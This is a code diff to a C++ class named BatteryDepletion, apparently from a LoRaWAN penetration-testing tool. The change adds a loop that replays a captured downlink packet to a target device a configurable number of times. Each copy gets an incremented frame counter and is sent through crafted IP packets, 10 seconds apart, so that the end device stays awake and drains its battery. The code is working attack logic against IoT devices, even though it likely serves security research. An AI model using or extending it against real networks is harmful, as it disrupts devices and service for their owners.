@@ -5,9 +5,18 @@
 #include <chrono>
 #include <thread>
 
+BatteryDepletion::BatteryDepletion(int downlinkCounter)
+{
+    _downlinkCounter = downlinkCounter;
+}
+
 Lorawan_result BatteryDepletion::setUpSending(std::shared_ptr<LorawanPacket> packet)
 {
     called(Logger::BatteryDepletion);
+
+    if(packet == nullptr)
+        return Lorawan_result::ErrorTestSetUp;
+
     testDevice->setEui64(packet->getEui64());
 
     downlink.setDstPort(packet->getDstPort());
@@ -39,18 +48,21 @@ Lorawan_result BatteryDepletion::launch()
             return Lorawan_result::ErrorTestSetUp;
         }
 
-        //        writeLog(Logger::BatteryDepletion, "Timeout for 1 s"); #in TTN server the downlink messages are queued
-        //        std::chrono::milliseconds timespan(1000);
-        //        std::this_thread::sleep_for(timespan);
-
         if(setUpSending(downlinkPacket) != Lorawan_result::Success)
         {
             return Lorawan_result::ErrorTestSetUp;
         }
-
-        if(sendExtraDownlinkPacket(downlinkPacket) != Lorawan_result::Success)
+        DataPacket copyPacket(downlinkPacket);
+        for(int i =1; i <= _downlinkCounter; i++)
         {
-            return Lorawan_result::ErrorTest;
+            writeLog(Logger::BatteryDepletion, "Sending next downlink packet no " +std::to_string(i));
+            if(sendExtraDownlinkPacket(copyPacket) != Lorawan_result::Success)
+            {
+                return Lorawan_result::ErrorTest;
+            }
+            writeLog(Logger::BatteryDepletion, "Timeout for 10 s"); //in TTN server the downlink messages are queued
+            std::chrono::milliseconds timespan(10000);
+            std::this_thread::sleep_for(timespan);
         }
 
         return Lorawan_result::Success;
@@ -66,12 +78,17 @@ Lorawan_result BatteryDepletion::launch()
 
 }
 
-Lorawan_result BatteryDepletion::sendExtraDownlinkPacket(std::shared_ptr<DataPacket> downlinkPacket)
+Lorawan_result BatteryDepletion::sendExtraDownlinkPacket(DataPacket& copyPacket)
 {
     std::string jsonToSend{};
     called(Logger::BatteryDepletion);
-    DataPacket copyPacket(downlinkPacket);
 
+
+    unsigned long int ulCount = Common::bytes2ULong(copyPacket.getFrameCounter());
+
+    ulCount += 1;
+
+    copyPacket.setFrameCounter(Common::ulong2Bytes(ulCount));
 
     if(copyPacket.serialize() != Lorawan_result::Success) //updated rawPacket
         return Lorawan_result::ErrorSerialize;
@@ -89,7 +106,7 @@ Lorawan_result BatteryDepletion::sendExtraDownlinkPacket(std::shared_ptr<DataPac
             != Lorawan_result::Success)
         return Lorawan_result::ErrorCreatingPacket;
 
-    Tins::IP refIP = downlinkPacket->getPacketIP();
+    Tins::IP refIP = copyPacket.getPacketIP();
     downlink.setIP(refIP);
     writeLog(Logger::BruteforcingMIC,"packet is based on IP with id = " + std::to_string(refIP.id()));
 
@@ -116,3 +133,4 @@ Lorawan_result BatteryDepletion::send(bytes magicFour, std::string json)
     writeLog(Logger::BatteryDepletion, "data to send: \n" + dataToSend);
     return downlink.send(dataToSend);
 }
+
